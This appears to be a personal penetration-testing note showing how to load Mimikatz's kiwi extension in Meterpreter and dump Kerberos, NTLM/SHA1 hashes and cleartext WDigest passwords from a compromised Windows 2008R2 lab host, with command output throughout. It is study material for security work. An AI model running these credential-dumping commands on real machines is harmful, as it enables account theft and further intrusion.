- I can be used to extract credentials, manipulate and abuse authentication mechanisms, and perform other post-exploitation activities on compromised machine.
- Metasploit has two versions of Mimikatz available as Meterpreter extensions: version 1.0 by loading the `mimikatz` extension.
- And the newer version 2.x by loading the `kiwi` extension. In this we talk about `kiwi`.

## Loading kiwi
```python
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```

## Listing the available commands 
```python
meterpreter > help kiwi

Kiwi Commands
=============

    Command       Description
    -------       -----------
    creds_all     Retrieve all credentials (parsed)
    creds_kerber  Retrieve Kerberos creds (parsed)
    os
    creds_livess  Retrieve Live SSP creds
------------------------------------SNIP-------------------------------------
```

## Retrieving the Kerberos credentials
```python
meterpreter > creds_kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

Username         Domain          Password
--------         ------          --------
(null)           (null)          (null)
Administrator    VAGRANT-2008R2  (null)
sshd_server      VAGRANT-2008R2  (null)
vagrant-2008r2$  WORKGROUP       (null)
```
- Note - Above command is not reliable becoz sometimes it's not even working.

## Retrieving the LM/NTLM hashes using the MSV authentication package
```python
meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username       Domain          NTLM                              SHA1
--------       ------          ----                              ----
Administrator  VAGRANT-2008R2  e02bc503339d51f71d913c245d35b50b  c805f88436bcd9ff534ee86c59ed230437505ecf
sshd_server    VAGRANT-2008R2  8d0a16cfc061c3359db455d00ec27035  94bd2df8ae5cadbbb5757c3be01dd40c27f9362f
```

## Retrieving cleartext credentials using mimikatz
# Pre-requisite - [[Local Security Authority Subsystem(LSASS)]]
```python
meterpreter > creds_wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

Username         Domain          Password
--------         ------          --------
(null)           (null)          (null)
Administrator    VAGRANT-2008R2  vagrant
VAGRANT-2008R2$  WORKGROUP       (null)
sshd_server      VAGRANT-2008R2  D@rj33l1ng
```

## Checking the version of mimikatz 
- the "kiwi_cmd" command is a plugin for Mimikatz
```python
meterpreter > kiwi_cmd version

mimikatz 2.2.0 (arch x64)
Windows NT 6.1 build 7601 (arch x64)
msvc 180031101 0
```

## Listing all the available modules
```python
meterpreter > kiwi_cmd ::
ERROR mimikatz_doLocal ; "" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
----------------------------------SNIP---------------------------------------
```

## Query the available options for a spefic module
```python
meterpreter > kiwi_cmd sekurlsa::
ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !

Module :	sekurlsa
Full name :	SekurLSA module
Description :	Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
-------------------------------------SNIP-------------------------------------
```